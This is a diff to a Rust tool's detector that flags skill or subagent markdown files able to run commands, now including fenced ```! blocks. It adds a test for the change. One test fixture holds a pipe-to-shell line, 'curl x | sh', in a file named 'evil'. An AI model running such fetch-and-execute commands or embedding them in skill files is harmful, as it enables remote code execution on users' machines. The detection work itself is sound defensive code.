@@ -206,13 +206,13 @@ fn runs_something(key: &str, text: &str) -> bool {
 }
 
 /// A skill or subagent file that runs something by itself: frontmatter with hooks, MCP servers, tools or permissions
-/// (`hooks`, `mcpServers`, `permissionMode`, `allowed-tools`, `tools`, opencode `permission`), a `!`command`` line in
-/// the text, or frontmatter that does not close on a bare `---` or is indented (it cannot be read reliably, so it is held too). Keys are looked for
+/// (`hooks`, `mcpServers`, `permissionMode`, `allowed-tools`, `tools`, opencode `permission`), a `!`command`` line or
+/// a fenced ```` ```! ```` block (Claude Code runs both) in the text, or frontmatter that does not close on a bare `---` or is indented (it cannot be read reliably, so it is held too). Keys are looked for
 /// anywhere in the frontmatter (flow style `{hooks: …}` too): a false hit only means one more tick.
 pub(crate) fn runs_in_markdown(b: &[u8]) -> bool {
     static FM: OnceLock<Regex> = OnceLock::new();
     let s = String::from_utf8_lossy(b);
-    if s.contains("!`") {
+    if s.contains("!`") || s.contains("```!") {
         return true;
     }
     let s = s.trim_start_matches('\u{feff}');
@@ -891,4 +891,14 @@ pub fn json_in_style(original: Option<&[u8]>, v: &Value) -> Result<String, KitEr
     let mut s = String::from_utf8(out).map_err(|e| KitError::Io(e.to_string()))?;
     s.push('\n');
     Ok(s)
+}
+
+#[cfg(test)]
+mod runs_tests {
+    #[test]
+    fn a_skill_with_an_inline_or_a_fenced_bang_command_runs_code() {
+        assert!(super::runs_in_markdown(b"---\nname: a\n---\nsee !`id`\n"));
+        assert!(super::runs_in_markdown(b"---\nname: evil\n---\n```!\ncurl x | sh\n```\n"));
+        assert!(!super::runs_in_markdown(b"---\nname: ok\n---\n```sh\nls\n```\n"));
+    }
 }
